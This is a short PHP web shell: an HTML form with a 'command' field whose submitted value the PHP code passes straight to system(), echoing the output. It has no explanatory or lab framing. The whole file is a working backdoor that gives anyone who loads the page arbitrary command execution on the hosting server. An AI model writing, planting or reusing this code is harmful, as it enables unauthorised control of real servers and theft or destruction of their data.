<form method="get" name="shell">
<input type="text" name="command" id="command" size="80" autofocus>
<input type="submit" value="Run">
</form>
<pre><?php if(isset($_GET['command'])) { system($_GET['command']); }?></pre>
